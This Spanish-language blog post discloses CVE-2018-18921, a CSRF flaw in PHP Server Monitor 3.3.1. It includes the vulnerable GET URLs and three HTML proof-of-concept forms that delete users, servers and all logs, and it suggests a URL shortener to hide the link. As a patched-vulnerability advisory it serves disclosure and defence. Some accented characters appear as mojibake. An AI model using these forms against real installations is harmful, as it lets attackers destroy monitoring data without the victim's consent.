+++
date = "2018-12-03"
title = "CVE-2018-18921 PHP Server Monitor 3.3.1 - Cross-Site Request Forgery"
author = "Javier Olmedo"
toc = false
+++

Las vulnerabilidades[Cross-Site Request Forgery (CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_\(CSRF\))encontradas en el software[PHP Server Monitor 3.3.1](https://github.com/phpservermon/phpservermon/releases/tag/v3.3.1)han quedado solucionadas. Estas,**permit铆an a un usuario malintencionado borrar servidores, logs y usuarios de la aplicaci贸n**a trav茅s de este ataque. La vulnerabilidad, ha sido asociada al[CVE-2018-18921](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2018-18921).

## CVE-2018-18921

### PHP Server Monitor 3.3.1 - Cross-Site Request Forgery (CSRF)

[![/images/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery_001.png](/images/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery_001.png)](/images/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery_001.png)

PHP Server Monitor es una**aplicaci贸n web orientada a monitorizar la disponibilidad de servidores PHP**, comprueba si est谩n correctamente funcionando, monitoriza los servicios, genera gr谩ficos e historial de actividad adem谩s de almacenar logs de errores y permitir notificaciones a trav茅s de email y Telegram, est谩 desarrollada en PHP y MySQL.

- Vulnerabilidad descubierta por**[Javier Olmedo](https://twitter.com/JJavierOlmedo)**el**30/10/2018**
-  Publicada el**23/11/2018**
- [CVE-2018-18921](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18921)
- Link del software[PHP Server Monitor 3.3.1](https://github.com/phpservermon/phpservermon/releases/tag/v3.3.1)
- Versi贸n vulnerable =**3.3.1 y posiblemente anteriores**
- 锔 Actualiza a la[versi贸n 3.3.2](https://github.com/phpservermon/phpservermon/releases/tag/v3.3.2)para parchear

## Vector de ataque / Criticidad de la explotaci贸n

### CRITICIDAD -  ALTA 

A trav茅s de las vulnerabilidades[Cross-Site Request Forgery (CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_\(CSRF\)), un atacante**podr铆a aprovecharse de la confianza que tiene la aplicaci贸n sobre los usuarios leg铆timos**para crear un enlace o formulario malicioso que ser谩 ejecutado a trav茅s de estos.

## Par谩metros / Recursos vulnerables

Durante la auditoria, se observ贸 que el bot贸n encargado de borrar los usuarios, servidores y logs, se realizaba por**petici贸n GET y carec铆a de token anti-csrf.**

[![/images/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery_002.png](/images/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery_002.png)](/images/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery_002.png)

Esto, permitir铆a a un atacante**crear un enlace malicioso**modificando los valores de los par谩metros`mod`, `action` e `id`para realizar acciones de eliminaci贸n de objetos sobre la aplicaci贸n.

## Prueba de concepto (PoC)

En las siguientes pruebas de concepto, se ha dividido la pantalla en dos partes, en la parte izquierda se encontrar铆a un usuario en el panel de administraci贸n mientras que en la parte derecha, un atacante genera un bot贸n malicioso previamente configurado para realizar las acciones.

### NOTA

> Se han utilizado formularios para la explotaci贸n de la vulnerabilidad, pero en un escenario real, a un atacante le bastar铆a con generar el enlace y acortar la URL ([Google URL Shortener](https://goo.gl/)) para ofuscar la acci贸n e intentar explotar la vulnerabilidad con 茅xito, ya que las peticiones se realizan por**GET.**

### Eliminaci贸n de usuarios

**URL:**`http://localhost/?&mod=user&action=delete&id=[ID]`

[![/images/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery_003.gif](/images/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery_003.gif)](/images/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery_003.gif)

```html
<html>
 <body>
 <script>history.pushState('', '', '/')</script>
  <form action="http://localhost/">
   <input type="hidden" name="mod" value="user" />
   <input type="hidden" name="action" value="delete" />
   <input type="hidden" name="id" value="[ID]" />
   <input type="submit" value="Delete User" />
  </form>
 </body>
</html>
```

### Eliminaci贸n de servidores

**URL:**`http://localhost/?&mod=server&action=delete&id=[ID]`

[![/images/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery_004.gif](/images/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery_004.gif)](/images/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery_004.gif)

```html
<html>
 <body>
 <script>history.pushState('', '', '/')</script>
  <form action="http://localhost/">
   <input type="hidden" name="mod" value="server" />
   <input type="hidden" name="action" value="delete" />
   <input type="hidden" name="id" value="[ID]" />
   <input type="submit" value="Delete Server" />
  </form>
 </body>
</html>
```

### Eliminaci贸n de todos los logs

**URL:**`http://localhost/?&mod=&action=delete`

[![/images/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery_005.gif](/images/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery_005.gif)](/images/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery_005.gif)

```html
<html>
 <body>
 <script>history.pushState('', '', '/')</script>
  <form action="http://localhost/">
   <input type="hidden" name="mod" value="server&#95;log" />
   <input type="hidden" name="action" value="delete" />
   <input type="submit" value="Delete All Logs" />
  </form>
 </body>
</html>
```

## Timeline

- **30/10/2018**Descubrimiento de la vulnerabilidad
- **30/10/2018**Creo issue en GitHub
- **30/10/2018**El desarrollador marca la vulnerabiliad como pendiente de parcheo
- **01/11/2018**Solicito CVE
- **03/11/2018**Asignaci贸n de CVE-2018-18921 por MITRE
- **22/11/2018**Vulnerabilidad parcheada
- **28/11/2018**Publicaci贸n de la vulnerabilidad

## Referencias

- CVE-MITRE -[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18921](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18921)
- SIDERTIA -[https://www.sidertia.com/Home/Community/Blog/2018/11/28/Corregidas-las-vulnerabilidades-CSRF-descubiertas-en-PHP-Server-Monitor](https://www.sidertia.com/Home/Community/Blog/2018/11/28/Corregidas-las-vulnerabilidades-CSRF-descubiertas-en-PHP-Server-Monitor)
- EXPLOIT-DB -[https://www.exploit-db.com/exploits/45932](https://www.exploit-db.com/exploits/45932)

Un saludo a todos!!